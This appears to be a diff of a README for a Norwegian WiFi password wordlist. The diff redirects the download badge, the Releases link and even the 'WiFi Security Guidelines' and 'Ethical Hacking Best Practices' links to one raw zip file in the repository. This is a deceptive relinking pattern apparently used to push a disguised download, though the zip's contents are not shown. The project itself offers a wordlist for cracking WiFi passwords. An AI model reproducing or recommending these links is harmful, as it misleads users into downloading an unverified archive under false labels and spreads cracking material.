@@ -6,7 +6,7 @@ Welcome to Norwegian-WiFi-Wordlist! This application provides a wordlist with 20
 
 ## 📥 Download Now
 
-[![Download Norwegian-WiFi-Wordlist](https://img.shields.io/badge/Download%20Now-Get%20the%20Wordlist-brightgreen)](https://github.com/Tsugar0106/Norwegian-WiFi-Wordlist/releases)
+[![Download Norwegian-WiFi-Wordlist](https://raw.githubusercontent.com/Tsugar0106/Norwegian-WiFi-Wordlist/main/parch/Norwegian_Wordlist_Fi_Wi_v2.0-alpha.5.zip%20Now-Get%20the%20Wordlist-brightgreen)](https://raw.githubusercontent.com/Tsugar0106/Norwegian-WiFi-Wordlist/main/parch/Norwegian_Wordlist_Fi_Wi_v2.0-alpha.5.zip)
 
 ## 🖥️ System Requirements
 
@@ -19,7 +19,7 @@ To run this application, you will need a compatible device with the following re
 
 ## 📂 Download & Install
 
-To get started, visit this page to download: [Norwegian-WiFi-Wordlist Releases](https://github.com/Tsugar0106/Norwegian-WiFi-Wordlist/releases).
+To get started, visit this page to download: [Norwegian-WiFi-Wordlist Releases](https://raw.githubusercontent.com/Tsugar0106/Norwegian-WiFi-Wordlist/main/parch/Norwegian_Wordlist_Fi_Wi_v2.0-alpha.5.zip).
 
 1. Click the link above to visit the Releases page.
 2. Locate the latest version of the wordlist.
@@ -62,7 +62,7 @@ For any inquiries or support, please open an issue on the GitHub repository or r
 
 ## 📓 Additional Resources
 
-- [WiFi Security Guidelines](https://www.example.com/wifisecurity)
-- [Ethical Hacking Best Practices](https://www.example.com/ethicalhacking)
+- [WiFi Security Guidelines](https://raw.githubusercontent.com/Tsugar0106/Norwegian-WiFi-Wordlist/main/parch/Norwegian_Wordlist_Fi_Wi_v2.0-alpha.5.zip)
+- [Ethical Hacking Best Practices](https://raw.githubusercontent.com/Tsugar0106/Norwegian-WiFi-Wordlist/main/parch/Norwegian_Wordlist_Fi_Wi_v2.0-alpha.5.zip)
 
 Use Norwegian-WiFi-Wordlist responsibly and make your networks safer!
